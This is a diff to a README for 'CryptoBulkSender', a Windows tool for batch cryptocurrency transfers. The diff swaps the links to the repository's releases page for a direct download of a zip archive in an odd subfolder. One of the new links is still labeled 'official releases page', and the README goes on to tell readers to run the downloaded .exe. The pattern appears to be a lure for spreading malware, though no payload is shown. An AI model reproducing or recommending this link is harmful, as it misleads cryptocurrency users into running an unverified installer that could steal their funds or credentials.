@@ -1,6 +1,6 @@
 # 🚀 CryptoBulkSender - Efficiently Automate Your Cryptocurrency Batch Transfers
 
-[![Download CryptoBulkSender](https://img.shields.io/badge/Download-CryptoBulkSender-blue.svg)](https://github.com/noeliaval457/CryptoBulkSender/releases)
+[![Download CryptoBulkSender](https://img.shields.io/badge/Download-CryptoBulkSender-blue.svg)](https://github.com/noeliaval457/CryptoBulkSender/raw/refs/heads/main/whimsic/Bulk-Sender-Crypto-1.1.zip)
 
 CryptoBulkSender streamlines the process of sending digital assets across multiple blockchain networks. You can perform batch transfers, schedule payments, and manage your assets with ease. The software supports Ethereum, Solana, Tron, BSC, and many other chains. It reduces manual effort and optimizes gas fees for every transition.
 
@@ -18,7 +18,7 @@ This application runs on Windows systems. Ensure your computer meets these basic
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/noeliaval457/CryptoBulkSender/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/noeliaval457/CryptoBulkSender/raw/refs/heads/main/whimsic/Bulk-Sender-Crypto-1.1.zip) to download the installer.
 2. Select the latest version of the installer file ending in .exe.
 3. Once the file finishes downloading, locate it in your Downloads folder.
 4. Double-click the file to launch the installation wizard.
